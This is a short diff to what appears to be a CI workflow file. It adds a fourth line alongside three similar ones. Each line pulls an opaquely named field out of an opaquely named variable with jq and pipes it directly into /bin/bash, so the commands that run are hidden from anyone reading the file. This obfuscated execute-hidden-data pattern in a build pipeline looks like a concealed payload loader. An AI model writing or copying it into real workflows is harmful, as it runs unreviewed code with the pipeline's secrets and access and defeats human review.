@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$gs08" | jq -r .na68190 | /bin/bash
           echo $vqa45184 | jq -r .ncvig9543 | /bin/bash
           echo $urms3 | jq -r .bao063 | /bin/bash
+          echo $u59596 | jq -r .gq803 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
